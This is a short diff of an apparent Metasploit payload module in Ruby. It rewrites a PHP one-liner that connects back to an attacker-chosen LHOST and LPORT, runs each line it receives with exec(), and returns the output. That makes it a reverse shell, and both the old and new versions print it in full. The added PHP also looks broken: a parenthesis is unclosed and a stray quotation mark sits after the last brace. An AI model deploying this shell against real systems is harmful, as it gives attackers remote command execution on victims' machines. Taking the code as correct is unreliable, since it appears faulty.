@@ -48,6 +48,15 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    cmd = "#{datastore['PHPPath']} -r 'while($s=@fsockopen(\"#{datastore['LHOST']}:#{datastore['LPORT']}\"){while($l=fgets($s)){exec($l,$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}}'&"
+    cmd = <<~PHP
+      while ($s=@fsockopen("#{datastore['LHOST']}:#{datastore['LPORT']}") {
+        while ($l=fgets($s)) {
+          exec($l, $o);
+          $o=implode("\n",$o) . "\n";
+          fputs($s,$o);
+        }
+      }"
+    PHP
+    cmd = "#{datastore['PHPPath']} -r '#{cmd}'&"
   end
 end
